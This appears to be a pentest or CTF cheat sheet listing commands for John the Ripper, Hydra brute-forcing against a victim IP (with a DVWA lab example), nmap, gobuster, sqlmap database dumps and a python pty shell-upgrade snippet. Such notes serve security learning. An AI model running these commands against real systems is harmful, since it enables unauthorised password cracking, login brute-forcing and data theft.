# <p align=center>John The Ripper</p>

### Bruteforce File
```
john --wordlist=[WORDLIST] [FILE]
```
### Show Format List
```
john --list=formats
```
### Bruteforce Hash
```
john --formats=[HASH] [FILE]
```
### PDF2John Online Tool
```
https://www.onlinehashcrack.com/tools-pdf-hash-extractor.php
```
### ZIP2John Command
```
zip2john [FILE]
```

# <p align=center>Hydra</p>

### Bruteforce Password
```
hydra -V -l [USERNAME] -P [WORDLIST] [IP VICTIM] [PROTOCOL]
```
### Bruteforce Via HTTP
```
hydra -V -l [USERNAME] -P [WORDLIST] [IP VICTIM] http-[REQUEST METHOD]-form "[PATH]:[REQUEST BODY]:[INCORRECT ALERT]"
```
Example :
```
hydra -V -l admin -P /usr/share/wordlists/rockyou.txt 10.10.10.10 http-get-form "/DVWA/vulnerabilities/brute:username=admin&password=^PASS^:Username and/or password incorrect."
```

# <p align=center>NMAP</p>

### Aggresive & Verbose Scan
```
nmap -v -A [IP]  
```

# <p align=center>Gobuster</p>

### Directory Enumeration
```
gobuster dir -u [URL] -w [WORDLIST] 
```

# <p align=center>Sqlmap</p>

### SQL Injection from File
```
sqlmap -r [FILE LOCATION] --dbs
```
### SQL DUMP
```
sqlmap -r [FILE LOCATION] --dump
```
Example :
```
sqlmap -r Belajar/learn/sqlmap/latihan.txt --dbs
```

# <p align=center>Reverse</p>

### Tools

- strings
- ltrace
- r2 -d
- gdb

### Reverse Shell
Python Spawning Bash
```
python -c 'import pty; pty.spawn("/bin/bash")'
```
Export Shell
```
export SHELL=bash
export TERM=xterm-256color
```
